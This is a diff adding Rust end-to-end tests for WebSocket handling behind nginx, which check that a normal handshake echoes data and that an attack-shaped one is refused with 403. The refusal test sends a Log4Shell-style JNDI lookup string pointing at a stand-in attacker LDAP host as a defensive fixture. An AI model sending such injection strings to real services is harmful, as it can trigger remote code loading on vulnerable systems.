@@ -536,3 +536,52 @@ async fn second_concurrent_request_to_a_held_path_gets_503() -> TestResult {
     assert_eq!(first.status, StatusCode::OK);
     Ok(())
 }
+
+/// Sends a WebSocket handshake through the edge and returns the socket and the response head.
+async fn websocket_handshake(
+    extra_header: &str,
+) -> Result<(tokio::net::TcpStream, String), common::BoxError> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let address = base().trim_start_matches("http://").to_owned();
+    let mut stream = tokio::net::TcpStream::connect(address).await?;
+    let request = format!(
+        "GET /ws/chat HTTP/1.1\r\nHost: ws.test\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\n{extra_header}\r\n"
+    );
+    stream.write_all(request.as_bytes()).await?;
+    let mut head = Vec::new();
+    let mut byte = [0u8; 1];
+    while !head.ends_with(b"\r\n\r\n") {
+        if stream.read(&mut byte).await? == 0 {
+            break;
+        }
+        head.push(byte[0]);
+    }
+    Ok((stream, String::from_utf8_lossy(&head).into_owned()))
+}
+
+#[tokio::test]
+#[ignore = "needs the e2e compose stack; run scripts/e2e.sh"]
+async fn websocket_echo_works_through_nginx_for_an_allowed_handshake() -> TestResult {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let (mut socket, head) = websocket_handshake("").await?;
+    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
+    socket.write_all(b"echo through nginx").await?;
+    let mut echoed = [0u8; 18];
+    tokio::time::timeout(
+        std::time::Duration::from_secs(5),
+        socket.read_exact(&mut echoed),
+    )
+    .await??;
+    assert_eq!(&echoed, b"echo through nginx");
+    Ok(())
+}
+
+#[tokio::test]
+#[ignore = "needs the e2e compose stack; run scripts/e2e.sh"]
+async fn attack_shaped_websocket_handshake_is_refused_through_nginx() -> TestResult {
+    let (_socket, head) =
+        websocket_handshake("X-Probe: ${jndi:ldap://attacker.test/a}\r\n").await?;
+    assert!(head.starts_with("HTTP/1.1 403"), "{head}");
+    assert!(!head.contains(" 101 "), "{head}");
+    Ok(())
+}
